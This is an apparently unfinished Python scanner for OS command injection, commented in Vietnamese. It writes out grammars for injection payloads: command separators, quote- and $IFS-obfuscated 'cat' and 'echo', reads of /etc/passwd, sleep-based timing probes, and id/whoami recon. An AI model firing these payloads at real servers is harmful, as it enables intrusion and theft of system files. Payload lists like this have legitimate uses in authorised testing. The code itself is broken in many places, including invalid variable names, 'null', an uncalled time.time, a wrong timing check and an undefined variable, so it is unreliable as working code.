'''
OS command injection tool
thực hiện detect vul này dựa trên 2 kỹ thuật: 
    + result-base
    + time-base

đối với result base thì chúng ta chỉ cần thực hiện gửi những đầu ra sẽ hiển thị lỗi ví dụ: echo "xyz", python -c ....
đối với time-base ta sẽ thực hiện truyền các câu lệnh sleep(x), delay(x), ...  Tính thời gian phản hồi của response để detect

2 Hệ điều hành: windows và linux
 Tổng cộng có 4 cái schema


Payload được tham khảo từ Payload all the thíngs
'''
class cmd:
    self.detect = [""]
    def generator(self, GRAMMAR):
            return set([simple_grammar_fuzzer(GRAMMAR) for i in range(1000)])

    def result_base_generator(self):
        result-based = {
            "<start>" : ["<quote><command>"],
            "<quote>" : ["|",";" ,"&&" , "&", "%0a"],
            "<command>" : ["<echo><spaceEcho><echoArgument>", "<cat><spaceCat><catArgument>"],
            "<echo>" : ["echo", "e'c'h'o", "e\"c\"h\"o", "ech$@o"],
            "<cat>" : ["cat", "c'a't", "c\"a\"t", "ca$@t"],
            "<spaceEcho>" : [" ", "  -e ", "%20"],
            "<spaceCat>" : ["<", "$IFS", " ", "%20"]
            "<echoArgument>" : ["This is fking test arg"],
            "<catArgument>" : [
                                "/etc/passwd", "\"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\"" , 
                                "${HOME:0:1}etc${HOME:0:1}passwd", "$(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd"
                            ]
        }
        return self.generator(result-based)

    def time_base_generator(self):
        time-based = {
            "<start>" : ["<quote><command>"],
            "<quote>" : ["|", ";"],
            "<command>" : ["timeout<space><time>", "delay<space><time>", "sleep<space><time>", "dir"],
            "<space>" : [" ", "%20"],
            "<time>" : ["5"]
        }
        return self.generator(time-based)

    def another_command(self):
        another = {
            "<start>" : ["<quote><command>"],
            "<command>" : ["id", "i'd'", "i\"d\"" "w'h'o'a'm'i'", "w\"h\"o\"a\"m\"i\"" "'u'n'a'm'e' -a", "\"u\"n\"a\"m\"e\" -a"]
        }
        return self.generator(time-based)

     def scanner(self, url, method, param, payload):
        	    status_code = 500
        r = null
        content = null
        status_code = 200
        conn = connect()
        start = time.time 
        # Cần phải truyền thêm parameter vào để phục vụ cho chức năng post
	    try:
            if method == "GET":
                url = url+ payload # nối chuỗi nào! 
	    	    r = conn.render_GET(url, payload)
            if method == "POST": 
                r = conn.normal_POST(url, param, payload)

	    	content = r.content
	    	status_code = r.status_code
	    except:
	        print "[!] Problem reaching '%s'." %website
	      	content = ""

        end = time.time
        if end == 5:
            print ("time-base command injection") 